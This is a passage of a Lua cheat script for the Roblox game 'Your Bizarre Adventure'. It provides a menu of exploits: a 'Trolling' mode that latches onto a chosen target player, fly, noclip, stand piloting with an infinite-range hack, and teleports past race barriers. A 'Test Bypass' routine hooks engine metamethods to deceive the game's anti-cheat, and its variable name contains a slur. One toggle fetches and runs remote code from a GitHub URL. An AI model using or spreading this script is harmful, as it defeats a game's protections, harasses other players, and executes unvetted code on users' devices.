        notify("View Stand", "Equipt your stand first")
return
end
    enableView(stand)
else
        disableView()
end
    end
})
TrollingTab:Space()
TrollingTab:Dropdown({
    Flag = "StickerMethod",
    Title = "Methods",
    Values = {"normal", "Down", "Up"},
    Value = "normal",
    Callback = function(option)
        method = option
        notify("YBA Script", "Method changed to: " .. method)
if stickerEnabled then
for entity, _ in pairs(activeAligns) do cleanupAlignFor(entity) end
end
if method ~= "Down" and method ~= "Up" then
        disableNoclip()
end
if (method == "Down" or method == "Up") and stickerEnabled and not viewing then
local stand = getStand()
if stand then
            enableView(stand)
end
end
    end
})
RunService.Heartbeat:Connect(function(dt)
    scanTimer = scanTimer + dt
if scanTimer >= CHECK_SCAN_INTERVAL then
        rebuildModelCache()
        scanTimer = 0
end
if viewing then
if not viewingStand or not viewingStand.Parent or not viewingStand:FindFirstChild("HumanoidRootPart") then
            disableView()
end
end
if not stickerEnabled then return end
local name = targetName
if not name or name == "" then return end
local stand = getStand()
if not stand then
return
end
local target = findClosestByName(name)
if not target then
    if next(activeAligns) ~= nil then
        notify("Sticker", "No alive target found (died?), turning off.")
        stickerToggle:Set(false)
        if viewEnabled then viewToggle:Set(false) end
        for entity,_ in pairs(activeAligns) do cleanupAlignFor(entity) end
    end
    return
end
local targetHRP = target:FindFirstChild("HumanoidRootPart")
local targetHum = target:FindFirstChild("Humanoid")
local isAlive = targetHum and targetHum.Health > 0
if not targetHRP or not targetHum then
for entity,_ in pairs(activeAligns) do cleanupAlignFor(entity) end
if method == "Down" or method == "Up" then enableNoclip() else disableNoclip() end
return
end
local myChar = player.Character
if stand and currentTargetForEntity[stand] ~= targetHRP then
local ok, res = pcall(createAlignsFor, stand, targetHRP, "back")
if not ok or not res then
            cleanupAlignFor(stand)
end
end
if method == "Down" or method == "Up" then
if currentTargetForEntity[myChar] ~= targetHRP then
local ok, res = pcall(createAlignsFor, myChar, targetHRP, method)
if not ok or not res then
                cleanupAlignFor(myChar)
end
end
else
        cleanupAlignFor(myChar)
        disableNoclip()
end
for entity, alignData in pairs(activeAligns) do
if alignData and alignData.attB and alignData.attB.Parent == targetHRP then
local desiredWorldPos
if alignData.stickMode == "back" then
                desiredWorldPos = targetHRP.Position - targetHRP.CFrame.LookVector * BACK_DISTANCE + Vector3.new(0, BACK_HEIGHT, 0)
elseif alignData.stickMode == "Down" then
local height = isAlive and -PLAYER_HEIGHT or PLAYER_HEIGHT
                desiredWorldPos = targetHRP.Position + Vector3.new(0, height, 0)
elseif alignData.stickMode == "Up" then
local height = isAlive and PLAYER_HEIGHT or -PLAYER_HEIGHT
                desiredWorldPos = targetHRP.Position + Vector3.new(0, height, 0)
end
if desiredWorldPos then
local localPos = targetHRP.CFrame:PointToObjectSpace(desiredWorldPos)
                alignData.attB.Position = localPos
end
else
pcall(smoothFallback, entity, targetHRP, alignData.stickMode, isAlive)
end
end
if (method == "Down" or method == "Up") and isAlive then
        enableNoclip()
else
if method ~= "Down" and method ~= "Up" then
            disableNoclip()
end
end
end)
TrollingTab:Space()
local flyEnabled = false
local flySpeed = 50
local flyBodyVelocity = nil
local flyBodyGyro = nil
local function enableFly()
    if flyEnabled then return end
    local char = player.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    local hrp = char.HumanoidRootPart
    flyBodyVelocity = Instance.new("BodyVelocity")
    flyBodyVelocity.Velocity = Vector3.new(0, 0, 0)
    flyBodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    flyBodyVelocity.Parent = hrp
    flyBodyGyro = Instance.new("BodyGyro")
    flyBodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
    flyBodyGyro.P = 100000
    flyBodyGyro.Parent = hrp
    flyEnabled = true
    notify("YBA Script", "Fly enabled.")
    spawn(function()
        while flyEnabled do
            if not char or not hrp then break end
            local moveDir = Vector3.new(0, 0, 0)
            if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.W) then
                moveDir = moveDir + workspace.CurrentCamera.CFrame.LookVector
            end
            if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.S) then
                moveDir = moveDir - workspace.CurrentCamera.CFrame.LookVector
            end
            if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.A) then
                moveDir = moveDir - workspace.CurrentCamera.CFrame.RightVector
            end
            if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.D) then
                moveDir = moveDir + workspace.CurrentCamera.CFrame.RightVector
            end
            if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.Space) then
                moveDir = moveDir + Vector3.new(0, 1, 0)
            end
            if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftControl) then
                moveDir = moveDir - Vector3.new(0, 1, 0)
            end
            if moveDir.Magnitude > 0 then
                moveDir = moveDir.Unit * flySpeed
                flyBodyVelocity.Velocity = moveDir
                flyBodyGyro.CFrame = workspace.CurrentCamera.CFrame
            else
                flyBodyVelocity.Velocity = Vector3.new(0, 0, 0)
            end
            wait()
        end
    end)
end
local function disableFly()
    if not flyEnabled then return end
    if flyBodyVelocity then flyBodyVelocity:Destroy() end
    if flyBodyGyro then flyBodyGyro:Destroy() end
    flyEnabled = false
    notify("YBA Script", "Fly disabled.")
end
local flyToggle = TrollingTab:Toggle({
    Flag = "Fly",
    Title = "Enable Fly",
    Default = false,
    Callback = function(value)
        if value then
            enableFly()
        else
            disableFly()
        end
    end
})
TrollingTab:Space()
local lastFlySpeedNotify = 0
local flySpeedSlider = TrollingTab:Slider({
    Flag = "FlySpeed",
    Title = "Fly Speed",
    Step = 1,
    Value = {
        Min = 1,
        Max = 400,
        Default = 50,
    },
    Callback = function(value)
        flySpeed = value
        if os.clock() - lastFlySpeedNotify > 1 then
            notify("YBA Script", "Fly speed set to " .. value)
            lastFlySpeedNotify = os.clock()
        end
    end
})
TrollingTab:Input({
    Flag = "CustomFlySpeed",
    Title = "Custom Fly Speed",
    Placeholder = "Enter 1-5000...",
    Callback = function(value)
        local speed = tonumber(value)
        if speed and speed > 0 and speed <= 5000 then
            flySpeed = speed
            notify("YBA Script", "Fly speed set to: " .. speed)
        else
            notify("Error", "Please enter a valid number between 1-5000!")
        end
    end
})
TrollingTab:Space()
getgenv().standPilotActive = false
getgenv().pilotSpeed = 16
getgenv().PilotConfig = {
    Speed = 50,
    SpeedChangerEnabled = false,
    IsActive = false
}
getgenv().pilotSpeed = 50
local pilotConnections = {}
local standAnimController = nil
local function cleanupPilot()
    if not getgenv().PilotConfig.IsActive then return end
  
    for _, conn in pairs(pilotConnections) do
        if conn and typeof(conn) == "RBXScriptConnection" then
            conn:Disconnect()
        end
    end
    pilotConnections = {}
    standAnimController = nil
  
    pcall(function()
        local tempStorage = game.ReplicatedStorage:FindFirstChild("TempStoragePilot")
        if tempStorage then
            for _, v in pairs(tempStorage:GetChildren()) do
                if v.Name == "Naples' Sewers" then
                    v.Parent = workspace.Locations
                end
            end
            tempStorage:Destroy()
        end
    end)
    
    pcall(function()
        local character = game.Players.LocalPlayer.Character
        if character and character:FindFirstChild("FocusCam") then
            character.FocusCam:Destroy()
        end
    end)
    
    pcall(function()
        local character = game.Players.LocalPlayer.Character
        if character then
            for _, part in pairs(character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = true
                end
            end
        end
    end)
    
    pcall(function()
        local character = game.Players.LocalPlayer.Character
        if character and character:FindFirstChild("StandMorph") then
            local standHRP = character.StandMorph:FindFirstChild("HumanoidRootPart")
            local hrp = character:FindFirstChild("HumanoidRootPart")
            local remoteFunc = character:FindFirstChild("RemoteFunction")
            if standHRP and hrp then
                hrp.CFrame = standHRP.CFrame
            end
            if remoteFunc then
                remoteFunc:InvokeServer("ToggleStand", "Toggle")
            end
        end
    end)
    
    getgenv().PilotConfig.IsActive = false
end

local pilotToggle = TrollingTab:Toggle({
    Flag = "PilotStand",
    Title = "Pilot Stand",
    Default = false,
    Callback = function(value)
        local player = game.Players.LocalPlayer
        local character = player.Character
        if not character then 
            notify("YBA Script", "Character not loaded!")
            pilotToggle:Set(false)
            return 
        end
        
        local hrp = character:FindFirstChild("HumanoidRootPart")
        local humanoid = character:FindFirstChild("Humanoid")
        local remoteFunc = character:FindFirstChild("RemoteFunction")
        
        if not hrp or not humanoid or not remoteFunc then
            notify("YBA Script", "Character not ready!")
            pilotToggle:Set(false)
            return
        end
        
        if getgenv().PilotConfig.IsActive then
            cleanupPilot()
            notify("YBA Script", "Stand Pilot disabled.")
            return
        end
        
        if not value then return end
        
        if not character:FindFirstChild("StandMorph") then
            remoteFunc:InvokeServer("ToggleStand", "Toggle")
            local waited = 0
            repeat task.wait(0.1) waited = waited + 0.1 until character:FindFirstChild("StandMorph") or waited > 5
            if not character:FindFirstChild("StandMorph") then
                notify("YBA Script", "Failed to summon stand!")
                pilotToggle:Set(false)
                return
            end
        end
        
        local standMorph = character.StandMorph
        standAnimController = standMorph.AnimationController
        local standHRP = standMorph:WaitForChild("HumanoidRootPart", 3)
        
        if not standAnimController or not standHRP then
            notify("YBA Script", "Stand not properly loaded!")
            pilotToggle:Set(false)
            return
        end
        
        if getgenv().PilotConfig.SpeedChangerEnabled then
            standAnimController.WalkSpeed = getgenv().PilotConfig.Speed
        end
        
        getgenv().PilotConfig.IsActive = true
        
        local tempStorage = Instance.new("Folder", game.ReplicatedStorage)
        tempStorage.Name = "TempStoragePilot"
        
        pcall(function()
            for _, v in pairs(workspace.Locations:GetChildren()) do
                if v.Name == "Naples' Sewers" then
                    v.Parent = tempStorage
                end
            end
        end)
        
        local cameraValue = Instance.new("ObjectValue", standMorph.Parent)
        cameraValue.Name = "FocusCam"
        cameraValue.Value = standAnimController
        
        for _, part in pairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = false
            end
        end
        
        pcall(function()
            local standAttach = standMorph.PrimaryPart:FindFirstChild("StandAttach")
            if standAttach then
                local alignOrient = standAttach:FindFirstChild("AlignOrientation")
                local alignPos = standAttach:FindFirstChild("AlignPosition")
                if alignOrient then alignOrient.Enabled = false end
                if alignPos then alignPos.Enabled = false end
            end
        end)
        
        table.insert(pilotConnections, humanoid:GetPropertyChangedSignal("Jump"):Connect(function()
            if humanoid.Jump then
                standAnimController.Jump = true
            end
            task.wait()
        end))
        
        table.insert(pilotConnections, RunService.Heartbeat:Connect(function()
            if not character or not character.Parent then return end
            if not standMorph or not standMorph.Parent then
                pcall(function() remoteFunc:InvokeServer("ToggleStand", "Toggle") end)
                return
            end
            
            local moveDirection = workspace.CurrentCamera.CFrame:VectorToObjectSpace(humanoid.MoveDirection)
            standAnimController:Move(moveDirection, true)
            
            if getgenv().PilotConfig.SpeedChangerEnabled then
                standAnimController.WalkSpeed = getgenv().PilotConfig.Speed
            end
            
            if standHRP and hrp then
                hrp.CFrame = standHRP.CFrame - Vector3.new(0, 25, 0)
            end
        end))
        
        pcall(function()
            for _, v in pairs(standMorph.Parent:GetDescendants()) do
                if v:IsA("BasePart") or v:IsA("UnionOperation") then
                    game:GetService("PhysicsService"):SetPartCollisionGroup(v, "Players")
                end
            end
        end)
        
        notify("YBA Script", "Stand Pilot enabled!")
    end
})

local pilotSpeedToggle = TrollingTab:Toggle({
    Flag = "PilotSpeedChanger",
    Title = "Pilot Speed Changer",
    Default = false,
    Callback = function(value)
        getgenv().PilotConfig.SpeedChangerEnabled = value
        if value and standAnimController then
            standAnimController.WalkSpeed = getgenv().PilotConfig.Speed
            notify("YBA Script", "Speed changer " .. (value and "enabled" or "disabled"))
        end
    end
})

local pilotSlider = TrollingTab:Slider({
    Flag = "PilotSpeed",
    Title = "Pilot Speed",
    Step = 1,
    Value = {
        Min = 0,
        Max = 200,
        Default = 50
    },
    Callback = function(value)
        getgenv().PilotConfig.Speed = value
        if getgenv().PilotConfig.SpeedChangerEnabled and standAnimController and standAnimController.Parent then
            standAnimController.WalkSpeed = value
        end
    end
})
local infPilotRangeConnection = nil
local infPilotRangeEnabled = false

local infPilotRangeToggle = TrollingTab:Toggle({
    Flag = "InfPilotRange",
    Title = "Inf Pilot Range",
    Default = false,
    Callback = function(value)
        infPilotRangeEnabled = value
        if value then
            notify("YBA Script", "Infinite Pilot Range enabled.")
            infPilotRangeConnection = game:GetService("RunService").Heartbeat:Connect(function()
                pcall(function()
                    local player = game:GetService("Players").LocalPlayer
                    if player.Character and player.Character:FindFirstChild("StandMorph") then
                        local isPiloting = player.Character.StandMorph:FindFirstChild("IsPiloting")
                        if isPiloting then
                            isPiloting.Value = 999999
                        end
                    end
                end)
            end)
        else
            notify("YBA Script", "Infinite Pilot Range disabled.")
            if infPilotRangeConnection then
                infPilotRangeConnection:Disconnect()
                infPilotRangeConnection = nil
            end
        end
    end
})

game.Players.LocalPlayer.CharacterAdded:Connect(function()
    if infPilotRangeEnabled and infPilotRangeConnection then
        infPilotRangeConnection:Disconnect()
        infPilotRangeConnection = nil
        wait(1)
        infPilotRangeConnection = game:GetService("RunService").Heartbeat:Connect(function()
            pcall(function()
                local player = game:GetService("Players").LocalPlayer
                if player.Character and player.Character:FindFirstChild("StandMorph") then
                    local isPiloting = player.Character.StandMorph:FindFirstChild("IsPiloting")
                    if isPiloting then
                        isPiloting.Value = 999999
                    end
                end
            end)
        end)
    end
end)
game.Players.LocalPlayer.CharacterAdded:Connect(function()
  if getgenv().standPilotActive then
    cleanupPilot()
    notify("YBA Script", "Stand Pilot auto-disabled (character respawned).")
    pilotToggle:Set(false)
  end
end)
do
    local KeybindsSection = KeybindsTab:Section({ Title = "Keybind Settings" })
    
    local KeybindStorage = {
        Fly = "",
        StandPilot = "",
        ItemFarm = "",
        InfDash = ""
    }
    
    local function handleKeybind(key, feature)
        if key == "" or key == nil then return end
        
        local success, err = pcall(function()
            if feature == "Fly" then
                local newValue = not flyEnabled
                flyToggle:Set(newValue)
            elseif feature == "StandPilot" then
                local newValue = not getgenv().PilotConfig.IsActive
                pilotToggle:Set(newValue)
            elseif feature == "ItemFarm" then
                local newValue = not normalFarmOn
                tpToItemsToggle:Set(newValue)
            elseif feature == "InfDash" then
                local currentState = Util:GetState("Infinite Dash")
                infiniteDashToggle:Set(not currentState)
            end
        end)
        
        if not success then
            warn("Keybind error for " .. feature .. ": " .. tostring(err))
        end
    end
    
    local KeybindConnections = {}
    
    local function setupKeybindListener(feature)
        if KeybindConnections[feature] then
            KeybindConnections[feature]:Disconnect()
            KeybindConnections[feature] = nil
        end
        
        local key = KeybindStorage[feature]
        if key == "" or key == nil then return end
        
        local keyCode = nil
        pcall(function()
            keyCode = Enum.KeyCode[key]
        end)
        
        if not keyCode then return end
        
        KeybindConnections[feature] = game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
            if gameProcessed then return end
            if input.KeyCode == keyCode then
                handleKeybind(key, feature)
            end
        end)
    end
    
    KeybindsSection:Input({
        Flag = "KeybindFly",
        Title = "Fly Keybind",
        Placeholder = "Leave blank to disable...",
        Callback = function(value)
            local upperValue = string.upper(value)
            KeybindStorage.Fly = upperValue
            setupKeybindListener("Fly")
        end
    })
    
    KeybindsSection:Input({
        Flag = "KeybindStandPilot",
        Title = "Stand Pilot Keybind",
        Placeholder = "Leave blank to disable...",
        Callback = function(value)
            local upperValue = string.upper(value)
            KeybindStorage.StandPilot = upperValue
            setupKeybindListener("StandPilot")
        end
    })
    
    KeybindsSection:Input({
        Flag = "KeybindItemFarm",
        Title = "Item Farm Keybind",
        Placeholder = "Leave blank to disable...",
        Callback = function(value)
            local upperValue = string.upper(value)
            KeybindStorage.ItemFarm = upperValue
            setupKeybindListener("ItemFarm")
        end
    })
    
    KeybindsSection:Input({
        Flag = "KeybindInfDash",
        Title = "Infinite Dash Keybind",
        Placeholder = "Leave blank to disable...",
        Callback = function(value)
            local upperValue = string.upper(value)
            KeybindStorage.InfDash = upperValue
            setupKeybindListener("InfDash")
        end
    })
    
    KeybindsSection:Space()
    
    KeybindsSection:Button({
        Title = "Reset All Keybinds",
        Callback = function()
            for k, _ in pairs(KeybindStorage) do
                KeybindStorage[k] = ""
            end
            
            for feature, conn in pairs(KeybindConnections) do
                if conn then
                    conn:Disconnect()
                end
                KeybindConnections[feature] = nil
            end
            
            pcall(function()
                if KeybindsSection then
                    for _, element in pairs(KeybindsSection:GetChildren() or {}) do
                        if element and element.Clear then
                            element:Clear()
                        elseif element and element.Set then
                            element:Set("")
                        end
                    end
                end
            end)
            
            notify("YBA Script", "All keybinds have been reset!")
        end
    })
    
    game:GetService("CoreGui").ChildRemoved:Connect(function(child)
        if child.Name:find("WindUI") or child.Name:find("Azure") then
            for _, conn in pairs(KeybindConnections) do
                if conn then
                    pcall(function() conn:Disconnect() end)
                end
            end
        end
    end)
end
local ConfigTab = SettingsTab
local ConfigManager = Window.ConfigManager
local ConfigName = "default"
local ConfigManager = Window.ConfigManager
local ConfigNameInput = ConfigTab:Input({
    Flag = "ConfigName",
    Title = "Config Name",
    Icon = "file-cog",
    Callback = function(value)
        ConfigName = value
end
})
local AllConfigs = ConfigManager:AllConfigs()
local DefaultValue = table.find(AllConfigs, ConfigName) and ConfigName or nil
ConfigTab:Dropdown({
    Title = "All Configs",
    Desc = "Select existing configs",
    Values = AllConfigs,
    Value = DefaultValue,
    Callback = function(value)
        ConfigName = value
        ConfigNameInput:Set(value)
end
})
ConfigTab:Space()
ConfigTab:Button({
    Title = "Save Config",
    Icon = "",
    Justify = "Center",
    Callback = function()
        Window.CurrentConfig = ConfigManager:CreateConfig(ConfigName)
if Window.CurrentConfig:Save() then
            WindUI:Notify({
                Title = "Config Saved",
                Desc = "Config '" .. ConfigName .. "' saved",
                Icon = "check",
})
end
end
})
ConfigTab:Space()
ConfigTab:Button({
    Title = "Load Config",
    Icon = "",
    Justify = "Center",
    Callback = function()
        Window.CurrentConfig = ConfigManager:CreateConfig(ConfigName)
if Window.CurrentConfig:Load() then
            WindUI:Notify({
                Title = "Config Loaded",
                Desc = "Config '" .. ConfigName .. "' loaded",
                Icon = "refresh-cw",
})
end
end
})
ConfigTab:Space()
ConfigTab:Button({
    Title = "Trash All Saved Configs",
    Icon = "trash-2",
    Justify = "Center",
    Callback = function()
        local allConfigs = ConfigManager:AllConfigs()
        local deletedCount = 0
        local failedCount = 0
        
        for _, configName in ipairs(allConfigs) do
            if configName ~= "default" then
                local success = pcall(function()
                    return ConfigManager:DeleteConfig(configName)
                end)
                if success then
                    deletedCount = deletedCount + 1
                else
                    failedCount = failedCount + 1
                end
            else
                local success = pcall(function()
                    return ConfigManager:DeleteConfig(configName)
                end)
                if success then
                    deletedCount = deletedCount + 1
                end
            end
        end
        
        local updatedConfigs = ConfigManager:AllConfigs()
        pcall(function()
            ConfigNameInput:Set("")
        end)
        
        WindUI:Notify({
            Title = "Configs Deleted",
            Desc = "Deleted " .. deletedCount .. " config(s)" .. (failedCount > 0 and " | Failed: " .. failedCount or ""),
            Icon = "trash",
            Duration = 5
        })
        
        ConfigName = "default"
    end
})
SettingsTab:Space()
SettingsTab:Section({
    Title = "Test Bypass",
    TextSize = 20,
    FontWeight = Enum.FontWeight.SemiBold,
})
SettingsTab:Paragraph({
    Title = "Bypass Tester",
    Desc = "Click the button below to test if your executor supports the bypass methods.",
})
SettingsTab:Dropdown({
    Flag = "ThemeChanger",
    Title = "Theme Changer",
    Values = {"Dark", "Light", "Rose", "Sky", "Plant", "Red", "Indigo", "Amber", "Violet", "Emerald", "Midnight", "Crimson", "michaels theme", "Cotton Candy", "Rainbow"},
    Value = "Dark",
    Callback = function(theme)
        pcall(function()
            WindUI:SetTheme(theme)
        end)
        notify("YBA Script", "Theme changed to " .. theme)
    end
})

SettingsTab:Button({
    Title = "Test Bypass",
    Callback = function()
        local bypassSuccess, bypassError = pcall(function()
            local oldMagnitude = hookmetamethod(Vector3.new(), "__index", newcclosure(function(self, index)
                local CallingScript = tostring(getcallingscript())
                if not checkcaller() and index == "magnitude" and CallingScript == "ItemSpawn" then
                    return 0
                end
                return oldMagnitude(self, index)
            end))
            
            local UzuKeeIsRetardedAndDoesntKnowHowToMakeAnAntiCheatOnTheServerSideAlsoVexStfuIKnowTheCodeIsBadYouDontNeedToTellMe = "  ___XP DE KEY"
            local oldNc = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
                local Method = getnamecallmethod()
                local Args = {...}
                if not checkcaller() and rawequal(self.Name, "Returner") and rawequal(Args[1], "idklolbrah2de") then
                    return UzuKeeIsRetardedAndDoesntKnowHowToMakeAnAntiCheatOnTheServerSideAlsoVexStfuIKnowTheCodeIsBadYouDontNeedToTellMe
                end
                return oldNc(self, ...)
            end))
            
            wait(0.1)
        end)

        if bypassSuccess then
            WindUI:Popup({
                Title = "Executor Supported",
                Icon = "check-circle",
                Content = "Your executor supports the bypass methods! You can use the script with reduced kick chance.",
                Buttons = {
                    {
                        Title = "Ok",
                        Icon = "check-circle",
                    }
                }
            })
            notify("YBA Script", "Bypass test passed! Executor supported.")
        else
            WindUI:Popup({
                Title = "Executor Not Supported",
                Icon = "bird",
                Content = "What is the error: " .. tostring(bypassError),
                Buttons = {
                    {
                        Title = "Ok",
                        Icon = "bird",
                    }
                }
            })
            notify("YBA Script", "Bypass test failed. Executor not supported.")
        end
    end
})
ConfigTab:Space()
ConfigTab:Dropdown({
    Flag = "ThemeChanger",
    Title = "Theme Changer",
    Values = {"Dark", "Light", "Rose", "Sky", "Plant", "Red", "Indigo", "Amber", "Violet", "Emerald", "Midnight", "Crimson", "Monokai Pro", "Cotton Candy", "Rainbow"},
    Value = "Dark",
    Callback = function(theme)
        pcall(function()
            WindUI:SetTheme(theme)
        end)
        notify("YBA Script", "Theme changed to " .. theme)
    end
})
ConfigTab:Space()

local webhookUIToggle = ConfigTab:Toggle({
    Flag = "WebhookUI",
    Title = "Open Webhook UI",
    Default = false,
    Callback = function(value)
        if value then
            local success, result = pcall(function()
                return loadstring(game:HttpGet("https://raw.githubusercontent.com/horithedev/Bruh/refs/heads/main/Webhook"))()
            end)
            
            if success then
                notify("YBA Script", "Webhook UI enabled!")
            else
                notify("YBA Script", "Failed to load Webhook UI: " .. tostring(result))
                webhookUIToggle:Set(false)
            end
        else
            pcall(function()
                if getgenv().WebhookUICleanup then
                    getgenv().WebhookUICleanup()
                end
            end)
            
            pcall(function()
                local player = game.Players.LocalPlayer
                if player and player.PlayerGui then
                    local commonNames = {"WebhookUI", "WebhookGui", "Webhook", "BruhUI"}
                    for _, name in pairs(commonNames) do
                        local gui = player.PlayerGui:FindFirstChild(name)
                        if gui then
                            gui:Destroy()
                        end
                    end
                end
            end)
            
            notify("YBA Script", "Webhook UI disabled!")
        end
    end
})
ConfigTab:Space()
ConfigTab:Keybind({
        Flag = "KeybindTest",
        Title = "Keybind",
        Desc = "Press to change keybind ui",
        Value = "K",
        Callback = function(v)
            Window:SetToggleKey(Enum.KeyCode[v])
        end
})
notify("YBA Script", "Script loaded successfully.")
local function LoadSBRFeatures()
    if not SBRTab then
        warn("SBR: SBRTab not found!")
        return
    end
    
    local isSBR = game.PlaceId == 4643697430
    
    if not isSBR then
        SBRTab:Section({ Title = "BETA" })
        SBRTab:Section({ Title = "Most SBR Features should work seemlessly, report any bugs in the Discord server." })
        SBRTab:Button({
            Title = "Teleport to SBR",
            Locked = false,
            Callback = function()
                game.TeleportService:Teleport(4643697430, game.Players.LocalPlayer)
            end
        })
        return
    end
    
    local success, err = pcall(function()
        local Azure = {Utils = {}}
        Azure.__index = Azure
        Azure.Utils.__index = Azure.Utils

        function Azure.Utils.MakeUtilController(Settings)
            local Utils = {
                Tasks = {}; Services = {}; States = {}; Ints = {}; 
                Strings = {}; Tables = {}; Settings = Settings or {ConfigName = "AzureV3/SBRConfig.json"};
            }
            Utils.Services = setmetatable({}, {__index = function(self, service)
                if rawget(self, service) then return rawget(self, service) end
                local GotService = game:GetService(service)
                self[service] = GotService
                return self[service]
            end})
            return setmetatable(Utils, Azure.Utils)
        end

        function Azure.Utils:MakeFolder()
            if isfolder("AzureV3") == false then makefolder("AzureV3") end
        end

        function Azure.Utils:ReadData()
            self:MakeFolder()
            local Data; pcall(function()
                Data = self.Services.HttpService:JSONDecode(readfile(self.Settings.ConfigName))
            end);
            Data = Data or {Int={}, State={}, String={}, Table={}}
            return {
                Data = Data;
                LoadData = function()
                    self:AddValues(self:ConvertConfig(Data))
                end;
            }
        end

        function Azure.Utils:WriteData(Data)
            self:MakeFolder()
            local StringData = self.Services.HttpService:JSONEncode(Data)
            pcall(function() writefile(self.Settings.ConfigName, StringData) end)
        end

        function Azure.Utils:ConvertConfig(Config)
            local RepTable = Config
            for i,v in pairs(RepTable) do
                for ValName, ValueTable in pairs(v) do
                    if ValueTable["Value"] ~= nil then
                        local Val = ValueTable.Value
                        ValueTable["Value"] = nil
                        ValueTable[1] = Val
                    end
                end
            end
            return RepTable
        end

        function Azure.Utils:AddValues(Values)
            for key, value in pairs(Values) do
                if key:lower() == "int" then
                    for i,v in pairs(Values[key]) do
                        self.Ints[i] = (type(v) == "number" and {["Value"] = v, ["SaveValue"] = false} or type(v) == "table" and {["Value"] = v[1], ["SaveValue"] = v["SaveValue"]})
                    end
                end
                if key:lower() == "state" then
                    for i,v in pairs(Values[key]) do
                        self.States[i] = (type(v) == "boolean" and {["Value"] = v, ["SaveValue"] = false} or type(v) == "table" and {["Value"] = v[1], ["SaveValue"] = v["SaveValue"]})
                    end
                end
                if key:lower() == "string" then
                    for i,v in pairs(Values[key]) do
                        self.Strings[i] = (type(v) == "string" and {["Value"] = v, ["Value"] = false} or type(v) == "table" and {["Value"] = v[1], ["SaveValue"] = v["SaveValue"]})
                    end
                end
                if key:lower() == "table" then
                    for i,v in pairs(Values[key]) do
                        self.Tables[i] = ((v["SaveValue"] and v["SaveValue"] == true) and {["Value"] = v[1], ["SaveValue"] = v["SaveValue"]} or {["Value"] = v, ["SaveValue"] = false})
                    end
                end
            end
        end

        function Azure.Utils:GetInt(Value) return self.Ints[Value] and self.Ints[Value].Value or 0 end
        function Azure.Utils:GetString(Value) return self.Strings[Value] and self.Strings[Value].Value or "" end
        function Azure.Utils:GetState(Value) return self.States[Value] and self.States[Value].Value or false end
        function Azure.Utils:GetTable(Value) return self.Tables[Value] and self.Tables[Value].Value or {} end
        function Azure.Utils:SetInt(Value, NewValue) if self.Ints[Value] then self.Ints[Value].Value = NewValue end end
        function Azure.Utils:SetState(Value, NewValue) if self.States[Value] then self.States[Value].Value = NewValue end end
        function Azure.Utils:SetTable(Value, NewValue) if self.Tables[Value] then self.Tables[Value].Value = NewValue end end
        function Azure.Utils:ChangeTable(Value, TableIndex, NewValue) if self.Tables[Value] then self.Tables[Value].Value[TableIndex] = NewValue end end
        function Azure.Utils:AddTask(TaskName, Task) if not self.Tasks[TaskName] then self.Tasks[TaskName] = Task end return Task end
        function Azure.Utils:IsTaskRunning(TaskName) return self.Tasks[TaskName] and self.Tasks[TaskName].Connected end
        function Azure.Utils:DisconnectTask(TaskName) if self:IsTaskRunning(TaskName) then self.Tasks[TaskName]:Disconnect(); self.Tasks[TaskName] = nil end end
        function Azure.Utils:GetService(Service) return self.Services[Service] end
        function Azure.Utils:GetPlayer() return self.Services.Players.LocalPlayer end
        function Azure.Utils:GetCharacter() return self:GetPlayer().Character or self:GetPlayer().CharacterAdded:Wait() end
        function Azure.Utils:GetHumanoid() local Character = self:GetCharacter(); return Character and Character:FindFirstChildWhichIsA("Humanoid") end
        function Azure.Utils:GetHRP() local Character = self:GetCharacter(); return Character and Character:FindFirstChild("HumanoidRootPart") end
        function Azure.Utils:IsSBR() return game.PlaceId == 4643697430 end
        function Azure.Utils:GetHorse() local Name = self:GetPlayer().Name; return workspace:FindFirstChild(Name .."'s Horse") end
        function Azure.Utils:Teleport(CF, Offset) local Character = self:GetCharacter(); local FinalCF = typeof(CF) == "Vector3" and CFrame.new(CF) or CF; if Character and Character.PrimaryPart then Character.PrimaryPart.CFrame = FinalCF + (Offset or Vector3.new(0, 0, 0)) end end

        local SBR_Util = Azure.Utils.MakeUtilController()
        SBR_Util:ReadData():LoadData()

        SBR_Util:AddValues{
            ["Int"] = {
                ["SBR_Delay_1"] = 5; ["SBR_Delay_2"] = 5; ["SBR_Delay_3"] = 5;
                ["SBR_Delay_4"] = 5; ["SBR_Delay_5"] = 5; ["SBR_Delay_Hide"] = 5;
                ["HorseWalkSpeed"] = 16; ["HorseJumpPower"] = 50;
            };
            ["State"] = {
                ["Use_Horse_ASBR"] = false; ["RedBarrierNoClip"] = false; ["PlayerESP"] = false;
            };
            ["String"] = {}; ["Table"] = {};
        }

        local SBRTeleports = {}
        pcall(function()
            SBRTeleports = {
                ["Stage 1 Barrier"] = workspace:FindFirstChild("Barriers"):FindFirstChild("1").CFrame,
                ["Stage 2 Barrier"] = workspace:FindFirstChild("Barriers"):FindFirstChild("2").CFrame,
                ["Stage 3 Barrier"] = workspace:FindFirstChild("Barriers"):FindFirstChild("3").CFrame,
                ["Stage 4 Barrier"] = workspace:FindFirstChild("Map"):FindFirstChild("NYC Bridge"):FindFirstChild("Start").CFrame,
                ["Normal Hide"] = workspace:FindFirstChild("Map"):FindFirstChild("NYC Bridge"):FindFirstChild("NYC Bridge"):FindFirstChild("Bridge"):FindFirstChild("MeshPart").CFrame,
                ["Finish Hide"] = workspace:FindFirstChild("Map"):FindFirstChild("NYC Bridge"):FindFirstChild("Start").CFrame - Vector3.new(0,30,0),
                ["Finish Line Barrier"] = workspace:FindFirstChild("Map"):FindFirstChild("NYC Bridge"):FindFirstChild("End_Line").CFrame + Vector3.new(0,100,0)
            };
        end)

        local SBRSettingsSection = SBRTab:Section({ Title = "SBR Settings" })
        local AutoSBRSection = SBRTab:Section({ Title = "Auto SBR" })
        local HorseControlsSection = SBRTab:Section({ Title = "Horse Controls" })
